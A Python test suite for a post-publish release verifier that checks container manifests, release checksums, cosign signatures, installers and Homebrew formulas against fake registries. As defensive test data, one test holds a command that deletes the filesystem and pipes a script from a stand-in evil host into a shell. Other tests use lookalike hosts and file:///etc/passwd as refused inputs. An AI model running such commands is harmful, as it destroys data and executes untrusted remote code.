"""Offline tests for scripts/qa/post-publish-verify.py (AAASM-6419).

No test touches the network: `FakeRegistry` is the injected fetcher and replays
recorded-shape GHCR and GitHub answers. Controls prove each probe can fail, and that
a record's free-text `command` is never executed.

Run: python3 -I scripts/tests/test_post_publish_verify.py
"""
from __future__ import annotations

import atexit
import contextlib
import hashlib
import importlib.util
import io
import json
import os
import re
import shutil
import subprocess
import sys
import tempfile
from pathlib import Path
from unittest import TestCase, main, mock
from urllib.parse import urlparse

ROOT = Path(__file__).resolve().parents[2]
SCRIPT = ROOT / "scripts/qa/post-publish-verify.py"
spec = importlib.util.spec_from_file_location("ppv", SCRIPT)
ppv = importlib.util.module_from_spec(spec)
sys.modules["ppv"] = ppv  # dataclasses resolve their module through sys.modules
spec.loader.exec_module(ppv)

TAG = "v0.0.1-rc.8"
TOKEN = "SECRET-ANON-TOKEN-VALUE"


def dg(b: bytes) -> str:
    return "sha256:" + hashlib.sha256(b).hexdigest()


def index_doc(platforms=("linux/amd64", "linux/arm64"), attest=True) -> bytes:
    manifests, n = [], 0
    for plat in platforms:
        os_, arch = plat.split("/")
        d = dg(f"image-{plat}".encode())
        manifests.append({"digest": d, "platform": {"os": os_, "architecture": arch}})
        if attest:
            manifests.append({"digest": dg(f"att-{plat}".encode()), "platform": {"os": "unknown", "architecture": "unknown"},
                              "annotations": {"vnd.docker.reference.type": "attestation-manifest",
                                              "vnd.docker.reference.digest": d}})
    return json.dumps({"schemaVersion": 2, "mediaType": "application/vnd.oci.image.index.v1+json", "manifests": manifests}).encode()


class FakeRegistry:
    """Replays answers keyed by URL substring; records every request made."""

    def __init__(self):
        self.calls: list[tuple[str, dict[str, str]]] = []
        self.routes: list[tuple[str, object]] = []

    def route(self, needle, answer):
        self.routes.append((needle, answer))
        return self

    def __call__(self, url, headers, timeout):
        self.calls.append((url, headers))
        assert timeout > 0
        for needle, ans in self.routes:
            if needle in url:
                if isinstance(ans, Exception):
                    raise ans
                return ans(url) if callable(ans) else ans
        return ppv.Response(404, {}, b"{}")


def good_ghcr(reg: FakeRegistry, image: str, body: bytes, by_digest_body: bytes | None = None, header=None):
    reg.route("ghcr.io/token", ppv.Response(200, {}, json.dumps({"token": TOKEN}).encode()))
    d = dg(body)
    reg.route(f"/v2/ai-agent-assembly/{image}/manifests/sha256:",
              ppv.Response(200, {"docker-content-digest": d}, by_digest_body if by_digest_body is not None else body))
    reg.route(f"/v2/ai-agent-assembly/{image}/manifests/{TAG}",
              ppv.Response(200, {"docker-content-digest": header or d}, body))
    return reg


def obligations(ids, extra_command="x") -> dict:
    return {"journeys": [{
        "journey": "J53", "pending_checks": [{"id": i, "channel": "c", "why_publication_only": "w",
                                              "command": extra_command, "expected": "e"} for i in ids],
        "failure_response": {"proposed_actions": ["hold the release"], "notify": ["release-owner"], "deadline_hours": 24}}]}


def run_main(reg, ids, extra_command="x", tag=TAG, argv_extra=()):
    d = Path(tempfile.mkdtemp(prefix="ppv-test-"))
    atexit.register(shutil.rmtree, d, True)
    p = d / "o.json"
    p.write_text(json.dumps(obligations(ids, extra_command)))
    buf = io.StringIO()
    with contextlib.redirect_stdout(buf):
        rc = ppv.main(["--tag", tag, "--obligations", str(p), *argv_extra], fetch=reg)
    out = buf.getvalue()
    return rc, (json.loads(out) if out.strip() else None), out


GHCR_IDS = ["j53-ghcr-tag-resolves", "j53-ghcr-digest-immutable", "j53-ghcr-multiarch", "j53-ghcr-sbom-attestation"]


class GhcrTests(TestCase):
    def test_good_publication_passes_everything_and_exits_zero(self):
        reg = good_ghcr(FakeRegistry(), "aa-gateway", index_doc())
        rc, rep, raw = run_main(reg, GHCR_IDS)
        self.assertEqual([r["status"] for r in rep["results"]], ["PASS"] * 4, raw)
        self.assertEqual(rc, 0)
        self.assertNotIn(TOKEN, raw, "the anonymous bearer token must never be printed")

    def test_only_get_to_allowlisted_hosts_with_bearer_on_manifests(self):
        reg = good_ghcr(FakeRegistry(), "aa-gateway", index_doc())
        run_main(reg, GHCR_IDS)
        for url, _ in reg.calls:
            self.assertTrue(url.startswith("https://ghcr.io/"), url)
        manifest_calls = [h for u, h in reg.calls if "/manifests/" in u]
        self.assertTrue(manifest_calls and all(h["Authorization"] == f"Bearer {TOKEN}" for h in manifest_calls))
        self.assertTrue(all("application/vnd.oci.image.index.v1+json" in h["Accept"] for h in manifest_calls))

    def test_body_not_matching_its_digest_fails(self):
        reg = good_ghcr(FakeRegistry(), "aa-gateway", index_doc(), header=dg(b"something else"))
        rc, rep, _ = run_main(reg, ["j53-ghcr-tag-resolves"])
        self.assertEqual(rep["results"][0]["status"], "FAIL")
        self.assertEqual(rc, 1)

    def test_digest_returning_different_bytes_fails(self):
        reg = good_ghcr(FakeRegistry(), "aa-gateway", index_doc(), by_digest_body=index_doc(attest=False))
        _, rep, _ = run_main(reg, ["j53-ghcr-digest-immutable"])
        self.assertEqual(rep["results"][0]["status"], "FAIL")

    def test_missing_arm64_fails(self):
        reg = good_ghcr(FakeRegistry(), "aa-gateway", index_doc(platforms=("linux/amd64",)))
        _, rep, _ = run_main(reg, ["j53-ghcr-multiarch"])
        self.assertEqual(rep["results"][0]["status"], "FAIL")
        self.assertIn("linux/arm64", rep["results"][0]["detail"])

    def test_single_manifest_is_not_multiarch(self):
        reg = good_ghcr(FakeRegistry(), "aa-gateway", json.dumps({"schemaVersion": 2, "layers": []}).encode())
        _, rep, _ = run_main(reg, ["j53-ghcr-multiarch"])
        self.assertEqual(rep["results"][0]["status"], "FAIL")

    def test_missing_sbom_attestation_fails(self):
        reg = good_ghcr(FakeRegistry(), "aa-gateway", index_doc(attest=False))
        _, rep, _ = run_main(reg, ["j53-ghcr-sbom-attestation"])
        self.assertEqual(rep["results"][0]["status"], "FAIL")

    def test_unpublished_tag_is_fail_not_inconclusive(self):
        reg = FakeRegistry().route("ghcr.io/token", ppv.Response(200, {}, json.dumps({"token": TOKEN}).encode()))
        rc, rep, _ = run_main(reg, ["j53-ghcr-tag-resolves"])
        self.assertEqual(rep["results"][0]["status"], "FAIL")
        self.assertEqual(rc, 1)

    def test_transport_failure_and_server_error_are_inconclusive_with_nonzero_exit(self):
        reg = FakeRegistry().route("ghcr.io/token", ppv.FetchError("TimeoutError"))
        rc, rep, _ = run_main(reg, ["j53-ghcr-tag-resolves"])
        self.assertEqual(rep["results"][0]["status"], "INCONCLUSIVE")
        self.assertEqual(rc, 3)
        reg = good_ghcr(FakeRegistry(), "aa-gateway", index_doc())
        reg.routes.insert(0, (f"/manifests/{TAG}", ppv.Response(503, {}, b"")))
        rc, rep, _ = run_main(reg, ["j53-ghcr-tag-resolves"])
        self.assertEqual(rep["results"][0]["status"], "INCONCLUSIVE")
        self.assertNotEqual(rc, 0)

    def test_runtime_image_bundle(self):
        reg = good_ghcr(FakeRegistry(), "aa-runtime", index_doc())
        rc, rep, _ = run_main(reg, ["j59-ghcr-runtime-image"])
        self.assertEqual(rep["results"][0]["status"], "PASS")
        self.assertEqual(rc, 0)


class ReleaseAssetTests(TestCase):
    SUMS_URL = "https://api.github.com/repos/ai-agent-assembly/agent-assembly/releases/assets/1"
    CDN = "https://objects.githubusercontent.com/sums"

    def names(self):
        return [n for n in ppv.required_assets(TAG)]

    def registry(self, drop=None, draft=False, state="uploaded", sums_drop=None, extra_sums=(), cdn=None):
        names = self.names()
        listed = [n for n in names if n != drop]
        assets = [{"name": n, "state": state, "size": 10, "url": self.SUMS_URL if n == "SHA256SUMS" else f"u/{n}"} for n in listed]
        sums = "".join(f"{'a' * 64}  {n}\n" for n in names if n != "SHA256SUMS" and n != sums_drop) + "".join(extra_sums)
        reg = FakeRegistry()
        reg.route("/releases/tags/", ppv.Response(200, {}, json.dumps({"draft": draft, "assets": assets}).encode()))
        reg.route("/releases/assets/1", ppv.Response(302, {"location": cdn or self.CDN}, b""))
        reg.route("objects.githubusercontent.com", ppv.Response(200, {}, sums.encode()))
        return reg

    def go(self, reg):
        return run_main(reg, ["j59-install-release-assets"])

    def test_complete_release_passes_and_sums_is_actually_read(self):
        reg = self.registry()
        rc, rep, _ = self.go(reg)
        self.assertEqual((rep["results"][0]["status"], rc), ("PASS", 0), rep)
        self.assertTrue(any(urlparse(u).hostname == "objects.githubusercontent.com" for u, _ in reg.calls), "SHA256SUMS content was not fetched")

    def test_missing_api_tarball_fails(self):
        # aa-api-server ships only in aasm-api-*, so a release without it cannot run J59
        victim = f"aasm-api-{TAG}-linux-amd64.tar.gz"
        _, rep, _ = self.go(self.registry(drop=victim, sums_drop=victim))
        self.assertEqual(rep["results"][0]["status"], "FAIL")
        self.assertIn(victim, rep["results"][0]["detail"])

    def test_sums_naming_an_absent_asset_fails(self):
        victim = f"aasm-cli-{TAG}-darwin-arm64.tar.gz"
        _, rep, _ = self.go(self.registry(drop=victim))
        self.assertEqual(rep["results"][0]["status"], "FAIL")
        self.assertIn("not a release asset", rep["results"][0]["detail"])

    def test_sums_omitting_a_required_tarball_fails(self):
        _, rep, _ = self.go(self.registry(sums_drop=f"aasm-api-{TAG}-linux-arm64.tar.gz"))
        self.assertEqual(rep["results"][0]["status"], "FAIL")

    def test_malformed_sums_line_fails(self):
        _, rep, _ = self.go(self.registry(extra_sums=["not a checksum line\n"]))
        self.assertEqual(rep["results"][0]["status"], "FAIL")

    def test_missing_sha256sums_fails(self):
        _, rep, _ = self.go(self.registry(drop="SHA256SUMS"))
        self.assertEqual(rep["results"][0]["status"], "FAIL")

    def test_draft_and_unuploaded_assets_fail(self):
        for kw in ({"draft": True}, {"state": "starter"}):
            _, rep, _ = self.go(self.registry(**kw))
            self.assertEqual(rep["results"][0]["status"], "FAIL", kw)

    def test_rate_limited_is_inconclusive(self):
        reg = FakeRegistry().route("/releases/tags/", ppv.Response(403, {}, b"rate limit"))
        _, rep, _ = self.go(reg)
        self.assertEqual(rep["results"][0]["status"], "INCONCLUSIVE")

    def test_download_redirect_to_foreign_host_is_refused_and_never_requested(self):
        reg = self.registry(cdn="https://evil.example/x")
        _, rep, _ = self.go(reg)
        self.assertEqual(rep["results"][0]["status"], "INCONCLUSIVE")
        self.assertFalse(any("evil.example" in u for u, _ in reg.calls))

    def test_authorization_is_never_sent_on_a_download(self):
        reg = self.registry()
        self.go(reg)
        for url, headers in reg.calls:
            if "/releases/assets/" in url or urlparse(url).hostname == "objects.githubusercontent.com":
                self.assertNotIn("Authorization", headers)


class RealFetcherRedirectTests(TestCase):
    """The real urllib fetcher against loopback servers: a 302 must not be followed and
    Authorization must not reach the redirect target."""

    def serve(self):
        import http.server
        import threading
        seen: list[dict[str, str]] = []

        class H(http.server.BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def do_GET(self):
                seen.append({k.lower(): v for k, v in self.headers.items()})
                if self.path == "/redirect":
                    self.send_response(302)
                    self.send_header("Location", target_url[0])
                    self.send_header("Content-Length", "0")
                    self.end_headers()
                else:
                    self.send_response(200)
                    self.send_header("Content-Length", "2")
                    self.end_headers()
                    self.wfile.write(b"ok")

        srv = http.server.HTTPServer(("127.0.0.1", 0), H)
        threading.Thread(target=srv.serve_forever, daemon=True).start()
        self.addCleanup(srv.server_close)
        self.addCleanup(srv.shutdown)
        target_url = [""]
        return srv, seen, target_url

    def test_redirect_is_not_followed_and_authorization_is_not_forwarded(self):
        origin, origin_seen, origin_target = self.serve()
        target, target_seen, _ = self.serve()
        origin_target[0] = f"http://127.0.0.1:{target.server_port}/stolen"
        r = ppv.urllib_fetcher(f"http://127.0.0.1:{origin.server_port}/redirect", {"Authorization": "Bearer TOK"}, 5)
        self.assertEqual(r.status, 302)
        self.assertEqual(r.headers["location"], origin_target[0])
        self.assertEqual(target_seen, [], "a request reached the redirect target")
        self.assertEqual(origin_seen[0].get("authorization"), "Bearer TOK")  # sent to the vetted origin only

    def test_default_urllib_would_have_forwarded_the_token(self):
        # control: proves the loopback setup can observe a leak, so the test above is not vacuous
        import urllib.request
        origin, _, origin_target = self.serve()
        target, target_seen, _ = self.serve()
        origin_target[0] = f"http://127.0.0.1:{target.server_port}/stolen"
        req = urllib.request.Request(f"http://127.0.0.1:{origin.server_port}/redirect", headers={"Authorization": "Bearer TOK"})
        with urllib.request.build_opener(urllib.request.ProxyHandler({})).open(req, timeout=5):
            pass
        self.assertEqual(target_seen[0].get("authorization"), "Bearer TOK")


class PartialRunTests(TestCase):
    def _run(self, only):
        reg = good_ghcr(FakeRegistry(), "aa-gateway", index_doc())
        err = io.StringIO()
        with contextlib.redirect_stderr(err):
            rc, rep, raw = run_main(reg, GHCR_IDS, argv_extra=[a for i in only for a in ("--only", i)])
        return rc, rep, err.getvalue()

    def test_only_subset_all_pass_is_partial_not_success(self):
        rc, rep, err = self._run(["j53-ghcr-tag-resolves"])
        self.assertEqual([r["status"] for r in rep["results"]], ["PASS"])
        self.assertEqual(rc, 4)
        self.assertEqual(rep["exit_code"], 4)
        self.assertIn("PARTIAL: 1 of 4 pending checks run", err)
        self.assertEqual(rep["partial"]["not_run"], GHCR_IDS[1:])

    def test_only_naming_every_pending_check_is_a_full_run(self):
        rc, rep, err = self._run(GHCR_IDS)
        self.assertEqual(rc, 0)
        self.assertIsNone(rep["partial"])
        self.assertNotIn("PARTIAL", err)

    def test_unknown_only_id_is_an_error_naming_it(self):
        err = io.StringIO()
        with contextlib.redirect_stderr(err):
            rc, rep, _ = run_main(FakeRegistry(), GHCR_IDS, argv_extra=["--only", "j53-ghcr-tag-resolvse"])
        self.assertEqual(rc, 2)
        self.assertIsNone(rep)
        self.assertIn("j53-ghcr-tag-resolvse", err.getvalue())

    def test_partial_line_is_printed_for_non_pass_partial_runs_too(self):
        reg = FakeRegistry()  # unrouted registry: the selected check is INCONCLUSIVE
        err = io.StringIO()
        with contextlib.redirect_stderr(err):
            rc, _, _ = run_main(reg, GHCR_IDS, argv_extra=["--only", "j53-ghcr-tag-resolves"])
        self.assertEqual(rc, 3)
        self.assertIn("PARTIAL: 1 of 4 pending checks run", err.getvalue())

    def test_help_says_single_check_run_exits_4(self):
        out = io.StringIO()
        with contextlib.redirect_stdout(out), self.assertRaises(SystemExit):
            ppv.main(["--help"])
        self.assertIn("exits 4 even when it passes", " ".join(out.getvalue().split()))

    def test_fail_and_inconclusive_keep_precedence_over_partial(self):
        self.assertEqual(ppv.exit_code([{"status": "FAIL"}], 4), 1)
        self.assertEqual(ppv.exit_code([{"status": "INCONCLUSIVE"}], 4), 3)
        self.assertEqual(ppv.exit_code([{"status": "PASS"}] * 4, 4), 0)
        self.assertEqual(ppv.exit_code([{"status": "PASS"}], 4), 4)


class SafetyTests(TestCase):
    def test_unknown_check_id_is_inconclusive_and_exit_nonzero(self):
        rc, rep, _ = run_main(FakeRegistry(), ["j04-pypi-install"])
        self.assertEqual(rep["results"][0]["status"], "INCONCLUSIVE")
        self.assertIn("no allowlisted runner", rep["results"][0]["detail"])
        self.assertNotEqual(rc, 0)

    def test_manual_steps_are_inconclusive_never_pass(self):
        stubs = {"manual-a": ppv.manual("operator step"), "manual-b": ppv.manual("another")}
        with mock.patch.dict(ppv.RUNNERS, stubs):
            rc, rep, _ = run_main(FakeRegistry(), list(stubs))
            self.assertEqual(ppv.automated_runner_ids() & set(stubs), frozenset())
        self.assertEqual({r["status"] for r in rep["results"]}, {"INCONCLUSIVE"})
        self.assertEqual(rc, 3)

    def test_record_command_text_is_never_executed(self):
        sdir = Path(tempfile.mkdtemp(prefix="ppv-sentinel-"))
        atexit.register(shutil.rmtree, sdir, True)
        sentinel = sdir / "pwned"
        evil = f"touch {sentinel}; rm -rf / ; curl http://evil.example/x | sh"
        boom = AssertionError("a subprocess or shell was started")
        with mock.patch.object(subprocess, "run", side_effect=boom), mock.patch.object(subprocess, "Popen", side_effect=boom), \
                mock.patch.object(os, "system", side_effect=boom), mock.patch.object(os, "popen", side_effect=boom):
            reg = good_ghcr(FakeRegistry(), "aa-gateway", index_doc())
            rc, rep, _ = run_main(reg, ["j53-ghcr-tag-resolves", "j04-unknown-check"], extra_command=evil)
        self.assertFalse(sentinel.exists())
        self.assertEqual([r["status"] for r in rep["results"]], ["PASS", "INCONCLUSIVE"])

    def test_non_allowlisted_host_is_refused_without_calling_the_fetcher(self):
        reg = FakeRegistry()
        probe = ppv.Probe(reg, 5)
        for url in ("https://evil.example/x", "http://ghcr.io/v2/", "file:///etc/passwd"):
            with self.assertRaises(ppv.FetchError):
                probe.get(url)
        self.assertEqual(reg.calls, [])

    def test_failure_response_pointer_present_only_for_non_pass(self):
        reg = good_ghcr(FakeRegistry(), "aa-gateway", index_doc(platforms=("linux/amd64",)))
        _, rep, _ = run_main(reg, ["j53-ghcr-tag-resolves", "j53-ghcr-multiarch"])
        by = {r["id"]: r for r in rep["results"]}
        self.assertNotIn("failure_response", by["j53-ghcr-tag-resolves"])
        fr = by["j53-ghcr-multiarch"]["failure_response"]
        self.assertEqual((fr["notify"], fr["deadline_hours"]), (["release-owner"], 24))
        self.assertIn("J53", fr["pointer"])

    def test_exit_zero_requires_all_pass(self):
        self.assertEqual(ppv.exit_code([]), 2)
        self.assertEqual(ppv.exit_code([{"status": "PASS"}, {"status": "INCONCLUSIVE"}]), 3)
        self.assertEqual(ppv.exit_code([{"status": "PASS"}, {"status": "FAIL"}, {"status": "INCONCLUSIVE"}]), 1)
        self.assertEqual(ppv.exit_code([{"status": "PASS"}]), 0)

    def test_only_filter_and_empty_selection(self):
        reg = good_ghcr(FakeRegistry(), "aa-gateway", index_doc())
        _, rep, _ = run_main(reg, GHCR_IDS, argv_extra=["--only", "j53-ghcr-multiarch"])
        self.assertEqual([r["id"] for r in rep["results"]], ["j53-ghcr-multiarch"])
        rc, rep, _ = run_main(reg, GHCR_IDS, argv_extra=["--only", "nope"])
        self.assertEqual(rc, 2)

    def test_bad_tag_and_bad_record_are_usage_errors(self):
        rc, _, _ = run_main(FakeRegistry(), GHCR_IDS, tag="v1/../../x")
        self.assertEqual(rc, 2)
        d = Path(tempfile.mkdtemp(prefix="ppv-test-"))
        atexit.register(shutil.rmtree, d, True)
        (d / "o.json").write_text("{}")
        with contextlib.redirect_stderr(io.StringIO()):
            self.assertEqual(ppv.main(["--tag", TAG, "--obligations", str(d / "o.json")], fetch=FakeRegistry()), 2)

    def test_cli_imports_under_isolated_mode(self):
        p = subprocess.run([sys.executable, "-I", str(SCRIPT), "--help"], capture_output=True, text=True, timeout=30)
        self.assertEqual(p.returncode, 0)
        self.assertIn("--obligations", p.stdout)


class AutomatedRunnerIdsTests(TestCase):
    def test_manual_stubs_are_excluded_and_probes_included(self):
        ids = ppv.automated_runner_ids()
        self.assertIn("j53-ghcr-tag-resolves", ids)
        self.assertIn("j59-install-release-assets", ids)
        # A stub that can only report INCONCLUSIVE must never count as automation.
        with mock.patch.dict(ppv.RUNNERS, {"stub": ppv.manual("x")}):
            self.assertNotIn("stub", ppv.automated_runner_ids())
        # AAASM-6424: every pending id the harnesses owe now has a real runner.
        self.assertEqual(ids, frozenset(ppv.RUNNERS))
        self.assertTrue(PENDING_IDS <= ids, sorted(PENDING_IDS - ids))


# --- AAASM-6424: runners for every pending id -------------------------------------------
import io as _io
import socket
import tarfile
import threading

PENDING_IDS = frozenset({
    "j04.published_install_sh_default", "j04.published_release_checksums_and_signature",
    "j04.published_homebrew_tap_install", "j04.published_homebrew_runtime",
    "j04.published_latest_resolves_to_candidate", "j04.published_crates_io_aa_cli",
    "j17.published_installer_profile_full_gateway", "j17.published_homebrew_gateway",
    "j17.published_container_image_manifest", "j53-published-image-runs-healthy",
    "j59-published-binaries-golden-path",
})
API = "https://api.github.com/repos/ai-agent-assembly/agent-assembly"
VER = TAG[1:]
INSTALLER = b"#!/bin/sh\n# --version <tag> --profile full\n"


class FakeTools:
    """Replaces `Tools`: records every argv, answers from `handler`, never runs a program."""

    def __init__(self, present=("cosign", "docker"), handler=None, system=("Linux", "x86_64"), health=("SERVING",)):
        self.present, self.handler, self.system = set(present), handler, system
        self.argvs: list[list[str]] = []
        self.health, self.health_calls = list(health), 0

    def which(self, name):
        return f"/fake/{name}" if name in self.present else None

    def run(self, argv, timeout, cwd=None, env=None):
        assert isinstance(argv, list) and timeout > 0
        self.argvs.append(list(argv))
        return self.handler(argv, cwd) if self.handler else (0, "", "")

    def grpc_health(self, host, port, timeout):
        self.health_calls += 1
        v = self.health[min(self.health_calls - 1, len(self.health) - 1)]
        if isinstance(v, Exception):
            raise v
        return v

    def platform(self):
        return self.system

    def sleep(self, s):
        pass


def hx(b: bytes) -> str:
    return hashlib.sha256(b).hexdigest()


class Gh(FakeRegistry):
    """A fake GitHub: release JSON with assets, asset bytes, SHA256SUMS, bundle, raw installer, tap, crates."""

    def __init__(self, files=None, drop=(), bundle=b'{"mediaType":"bundle"}', draft=False, digest_override=None,
                 state="uploaded", sums_override=None, installer=INSTALLER):
        super().__init__()
        names = [n for n in ppv.required_assets(TAG) if n != "SHA256SUMS"]
        self.files = files or {n: f"content-{n}".encode() for n in names}
        self.files["SHA256SUMS.cosign.bundle"] = bundle
        sums = sums_override if sums_override is not None else "".join(
            f"{hx(b)}  {n}\n" for n, b in self.files.items() if n != "SHA256SUMS.cosign.bundle").encode()
        self.sums = sums
        self.files["SHA256SUMS"] = sums
        assets = []
        for i, (n, b) in enumerate(self.files.items()):
            if n in drop:
                continue
            d = (digest_override or {}).get(n, "sha256:" + hx(b))
            url = f"{API}/releases/assets/{1000 + i}"
            assets.append({"name": n, "state": state, "size": len(b), "url": url, "digest": d})
            self.route(f"/releases/assets/{1000 + i}", ppv.Response(200, {}, b))
        self.routes.insert(0, ("/releases/tags/", ppv.Response(200, {}, json.dumps({"draft": draft, "assets": assets}).encode())))
        if installer is not None:
            self.route("raw.githubusercontent.com", ppv.Response(200, {}, installer))


def run_ids(reg, ids, tools=None, installer_sha=hx(INSTALLER)):
    pend = [{"journey": "J", "id": i, "failure_response": None} for i in ids]
    rows = ppv.verify(pend, TAG, reg, 5, tools=tools or FakeTools(), installer_sha256=installer_sha)
    return {r["id"]: (r["status"], r["detail"]) for r in rows}


def one(reg, cid, **kw):
    return run_ids(reg, [cid], **kw)[cid]


class HostAllowlistTests(TestCase):
    def test_new_hosts_allowed_and_lookalikes_refused_without_a_request(self):
        reg = FakeRegistry()
        probe = ppv.Probe(reg, 5)
        for url in ("https://crates.io.evil.example/api", "https://evilcrates.io/api", "https://static.crates.io/x",
                    "https://raw.githubusercontent.com.evil.example/x", "https://xraw.githubusercontent.com/x",
                    "https://api.github.com.evil.example/x", "http://crates.io/api", "https://user@evil.example:443/"):
            with self.assertRaises(ppv.FetchError, msg=url):
                probe.get(url)
        self.assertEqual(reg.calls, [])
        probe.get("https://crates.io/api/v1/crates/x")
        probe.get("https://raw.githubusercontent.com/o/r/t/f")
        self.assertEqual(len(reg.calls), 2)

    def test_download_redirect_to_lookalike_is_refused(self):
        reg = FakeRegistry().route("/a", ppv.Response(302, {"location": "https://objects.githubusercontent.com.evil.example/x"}, b""))
        with self.assertRaises(ppv.FetchError):
            ppv.Probe(reg, 5).download(f"{API}/releases/assets/a")
        self.assertEqual(len(reg.calls), 1)


class ChecksumSignatureTests(TestCase):
    ID = "j04.published_release_checksums_and_signature"

    def test_pass_runs_cosign_with_tag_scoped_identity(self):
        t = FakeTools()
        st, detail = one(Gh(), self.ID, tools=t)
        self.assertEqual(st, "PASS", detail)
        argv = t.argvs[0]
        self.assertEqual(argv[1], "verify-blob")
        self.assertIn("release\\.yml@refs/tags/" + re.escape(TAG) + "$", " ".join(argv))
        self.assertIn("https://token.actions.githubusercontent.com", argv)

    def test_cosign_absent_is_inconclusive_not_pass(self):
        self.assertEqual(one(Gh(), self.ID, tools=FakeTools(present=()))[0], "INCONCLUSIVE")

    def test_cosign_rejecting_the_signature_fails(self):
        t = FakeTools(handler=lambda a, c: (1, "", "no matching signatures"))
        self.assertEqual(one(Gh(), self.ID, tools=t)[0], "FAIL")

    def test_missing_bundle_fails_and_cosign_is_not_consulted(self):
        t = FakeTools()
        st, detail = one(Gh(drop=("SHA256SUMS.cosign.bundle",)), self.ID, tools=t)
        self.assertEqual(st, "FAIL")
        self.assertEqual(t.argvs, [])

    def test_sums_naming_a_missing_member_fails(self):
        gh = Gh(drop=("aasm-aarch64-apple-darwin.tar.gz",))
        self.assertEqual(one(gh, self.ID)[0], "FAIL")

    def test_digest_mismatch_between_api_and_sums_fails(self):
        gh = Gh(digest_override={"aasm-aarch64-apple-darwin.tar.gz": "sha256:" + "0" * 64})
        st, detail = one(gh, self.ID)
        self.assertEqual(st, "FAIL")
        self.assertIn("aasm-aarch64-apple-darwin.tar.gz", detail)

    def test_downloaded_sums_not_matching_api_digest_fails(self):
        self.assertEqual(one(Gh(digest_override={"SHA256SUMS": "sha256:" + "1" * 64}), self.ID)[0], "FAIL")

    def test_empty_or_non_json_bundle_fails(self):
        self.assertEqual(one(Gh(bundle=b""), self.ID)[0], "FAIL")
        self.assertEqual(one(Gh(bundle=b"not json"), self.ID)[0], "FAIL")

    def test_draft_release_fails(self):
        self.assertEqual(one(Gh(draft=True), self.ID)[0], "FAIL")


class InstallerTests(TestCase):
    IDS = {"j04.published_install_sh_default": b"--version", "j17.published_installer_profile_full_gateway": b"--profile"}

    def test_pass_and_installer_is_never_executed(self):
        t = FakeTools()
        for cid in self.IDS:
            st, detail = one(Gh(), cid, tools=t)
            self.assertEqual(st, "PASS", detail)
        self.assertEqual(t.argvs, [])

    def test_installer_digest_mismatch_fails(self):
        for cid in self.IDS:
            self.assertEqual(one(Gh(installer=INSTALLER + b"# tampered\n"), cid)[0], "FAIL")

    def test_installer_missing_or_empty_fails(self):
        for cid in self.IDS:
            self.assertEqual(one(Gh(installer=None), cid)[0], "FAIL")
            self.assertEqual(one(Gh(installer=b""), cid)[0], "FAIL")

    def test_installer_without_the_option_fails(self):
        bare = b"#!/bin/sh\n"
        for cid in self.IDS:
            self.assertEqual(one(Gh(installer=bare), cid, installer_sha=hx(bare))[0], "FAIL")

    def test_release_assets_missing_fails(self):
        for cid in self.IDS:
            self.assertEqual(one(Gh(drop=("aasm-x86_64-apple-darwin.tar.gz",)), cid)[0], "FAIL")

    def test_without_record_digest_falls_back_to_the_checkout_copy(self):
        st, _ = one(Gh(installer=(ROOT / "scripts/install-cli.sh").read_bytes()), "j04.published_install_sh_default", installer_sha=None)
        self.assertEqual(st, "PASS")
        st, _ = one(Gh(installer=b"--version other"), "j04.published_install_sh_default", installer_sha=None)
        self.assertEqual(st, "FAIL")

    def test_record_digest_is_read_from_the_obligations_file(self):
        doc = {"journeys": [{"journey": "J04", "installer_sha256": "a" * 64}, {"journey": "J17"}]}
        self.assertEqual(ppv.installer_sha_from(doc), "a" * 64)
        self.assertIsNone(ppv.installer_sha_from({"journeys": [{"installer_sha256": "xyz"}]}))


class LatestTests(TestCase):
    ID = "j04.published_latest_resolves_to_candidate"

    def reg(self, top=TAG, latest=None):
        r = FakeRegistry()
        r.route("/releases?per_page=1", ppv.Response(200, {}, json.dumps([{"tag_name": top}]).encode()))
        r.route("/releases/latest", ppv.Response(200, {}, json.dumps({"tag_name": latest}).encode()) if latest else ppv.Response(404, {}, b"{}"))
        return r

    def test_pass_via_fallback_and_via_latest(self):
        self.assertEqual(one(self.reg(), self.ID)[0], "PASS")
        self.assertEqual(one(self.reg(latest=TAG), self.ID)[0], "PASS")

    def test_latest_is_another_release_fails(self):
        st, d = one(self.reg(latest="v0.0.0"), self.ID)
        self.assertEqual(st, "FAIL")
        self.assertIn("v0.0.0", d)

    def test_newest_is_not_the_tag_fails(self):
        self.assertEqual(one(self.reg(top="v0.0.1-rc.9"), self.ID)[0], "FAIL")

    def test_server_error_is_inconclusive(self):
        r = FakeRegistry().route("/releases", ppv.Response(500, {}, b""))
        self.assertEqual(one(r, self.ID)[0], "INCONCLUSIVE")
        r = self.reg()
        r.routes.insert(0, ("/releases/latest", ppv.Response(503, {}, b"")))
        self.assertEqual(one(r, self.ID)[0], "INCONCLUSIVE")


def formula(url_base="v0.0.1-rc.8", sums=None, binary="aa-gateway", names=("aasm-x86_64-apple-darwin.tar.gz", "aasm-aarch64-apple-darwin.tar.gz")):
    out = f"class X < Formula\n  # {binary}\n"
    for n in names:
        out += f'  url "https://github.com/ai-agent-assembly/agent-assembly/releases/download/{url_base}/{n}"\n'
        out += f'  sha256 "{(sums or {}).get(n, "0" * 64)}"\n'
    return out


class HomebrewTests(TestCase):
    CASES = [("j04.published_homebrew_tap_install", "Formula/aasm.rb", "aa-gateway"),
             ("j04.published_homebrew_runtime", "Formula/aasm-runtime.rb", "aa-runtime"),
             ("j17.published_homebrew_gateway", "Formula/aasm.rb", "aa-gateway")]

    def reg(self, path, binary, version=VER, mutate=None, tap_status=200):
        gh = Gh()
        sums = {n: s for s, n in (line.split("  ") for line in gh.sums.decode().splitlines())}
        if mutate:
            sums = mutate(sums)
        gh.routes.insert(0, ("contents/metadata/versions.rb", ppv.Response(200, {}, f'VERSION = "{version}"\n'.encode())))
        gh.routes.insert(0, (f"contents/{path}", ppv.Response(tap_status, {}, formula(sums=sums, binary=binary).encode())))
        return gh

    def test_pass(self):
        for cid, path, binary in self.CASES:
            st, d = one(self.reg(path, binary), cid)
            self.assertEqual(st, "PASS", d)

    def test_only_reads_the_tap_via_api_with_get(self):
        gh = self.reg("Formula/aasm.rb", "aa-gateway")
        one(gh, "j04.published_homebrew_tap_install")
        self.assertTrue(any("homebrew-tap/contents/Formula/aasm.rb" in u for u, _ in gh.calls))

    def test_formula_sha_mismatch_fails(self):
        for cid, path, binary in self.CASES:
            def bad(s):
                s = dict(s)
                s["aasm-aarch64-apple-darwin.tar.gz"] = "f" * 64
                return s
            st, d = one(self.reg(path, binary, mutate=bad), cid)
            self.assertEqual(st, "FAIL")
